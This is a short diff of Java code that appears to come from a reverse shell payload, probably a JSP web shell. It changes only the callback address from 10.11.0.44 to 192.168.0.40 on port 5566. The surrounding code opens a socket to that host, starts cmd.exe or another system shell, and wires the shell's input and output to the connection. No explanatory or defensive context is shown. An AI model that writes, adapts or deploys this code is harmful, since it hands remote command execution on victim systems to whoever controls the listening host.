@@ -50,7 +50,7 @@ if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
   ShellPath = new String("cmd.exe");
 }
 
-    Socket socket = new Socket( "10.11.0.44", 5566 );
+    Socket socket = new Socket( "192.168.0.40", 5566 );
     Process process = Runtime.getRuntime().exec( ShellPath );
     ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
     ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
